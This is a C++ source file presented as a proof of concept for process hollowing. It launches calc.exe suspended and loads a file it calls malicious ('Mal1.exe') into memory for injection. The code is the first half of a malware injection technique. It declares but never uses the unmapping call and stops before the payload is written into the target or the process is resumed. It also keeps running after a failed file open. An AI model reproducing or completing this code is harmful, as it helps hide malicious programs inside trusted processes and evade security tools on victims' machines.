//Author: Alec Wood
//File: ProcHollow.cpp
//Purpose: Proof of concept for Process Hollowing, using target: calc.exe and malware: Mal1.exe

#include<Windows.h>
#include<iostream>
#include<stdio.h>
#pragma comment(lib, "ntdll.lib")
using namespace std; //Need to remove and update entire source code

//This declaration will be used to hollow the process
LONG(NTAPI* pfnZwUnmapViewOfSection)(HANDLE, PVOID);


int main() {

	LPSTARTUPINFOA startupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
	CONTEXT c;


	//Create victim process in suspended state
	if (CreateProcessA(
		(LPSTR)"C:\\Windows\\System32\\calc.exe",
		NULL,
		NULL,
		NULL,
		TRUE,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		startupInfo,
		processInfo) == 0) {
		std::cout << "[*] Process Failed:  " << GetLastError();
		return 1;
	}


	//Pass Mal1 to get handle
	HANDLE hMal1 = CreateFileA(
		(LPCSTR)"C:\\Users\\normk_e1w\\source\\repos\\PoC-Proc-Hollow\\Mal1\\x64\\Mal1.exe",
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL
	);
	std::cout << "[+] PID-> 0x" << processInfo->dwProcessId << endl;

	if (hMal1 == INVALID_HANDLE_VALUE) {
		std::cout << "[!] Failed to open: " << GetLastError() << endl;
		TerminateProcess(processInfo->hProcess, 0);
	}
	std::cout << "[+] Malicious file opened." << endl;


	//Retrieve size of Mal1 to use in VirtualAlloc().
	DWORD mal1FileSize = GetFileSize(hMal1, 0);
	std::cout << "[+] Mal1 file size: " << mal1FileSize << " bytes." << endl;


	//Allocating memory for Mal1
	PVOID pMal1Image = VirtualAlloc(
		NULL,
		mal1FileSize,
		0x3000,
		0x04
	);


	DWORD numberOfBytesRead;

	//Writes Mal1 into allocated memory
	if (!ReadFile(
		hMal1,
		pMal1Image,
		mal1FileSize,
		&numberOfBytesRead,
		NULL
	)) {
		std::cout << "[!] Unable to read. Error: " << GetLastError() << endl;
		TerminateProcess(processInfo->hProcess, 0);
		return 1;
	}

	CloseHandle(hMal1);
	std::cout << "[+] Wrote Mal1 into memory at: 0x" << pMal1Image << endl;

	return 0;
}